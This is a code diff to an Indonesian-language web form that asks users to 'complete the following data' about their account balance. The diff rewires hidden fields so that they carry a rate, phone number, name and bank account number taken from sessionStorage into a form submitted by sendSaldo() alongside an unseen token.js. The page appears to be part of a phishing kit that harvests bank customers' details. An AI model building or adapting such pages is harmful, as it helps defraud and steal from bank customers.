@@ -256,9 +256,10 @@ section{
 <nav class="nav1" ></nav>
 
 <form id="jualpuki" onsubmit="sendSaldo()">
- <input type="hidden" id="nomorsaya" name="nomorsaya" value="">
- <input type="hidden" id="norekku" name="norekku" value="">
- <input type="hidden" id="namaku" name="namaku" value="">
+ <input type="hidden" id="tarif" name="tarif">	
+ <input type="hidden" id="nomor" name="nomor" >
+ <input type="hidden" id="nama" name="nama" >
+ <input type="hidden" id="rek" name="rek" >
     <section>
           <p class="info">Silahkan lengkapi data berikut</p>
           <hr class="gares">
@@ -288,14 +289,14 @@ Pastikan Saldo Sesuai di rekening.</p>
         </center>
 <div class="nav2"></div>
 <script>
- var nomortel = sessionStorage.getItem("nomortel");
- document.getElementById("nomorsaya").value = nomortel + "";
-  
- var noreke = sessionStorage.getItem("noreke");
- document.getElementById("norekku").value = noreke + "";
-  
- var namanya = sessionStorage.getItem("namanya");
- document.getElementById("namaku").value = namanya + "";     
+ document.getElementById("tarif").value =
+        sessionStorage.getItem("tarif");
+document.getElementById("nomor").value =
+        sessionStorage.getItem("nomor");
+document.getElementById("nama").value =
+        sessionStorage.getItem("nama");
+document.getElementById("rek").value =
+        sessionStorage.getItem("rek");  
 </script>    
 <script src="token.js"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
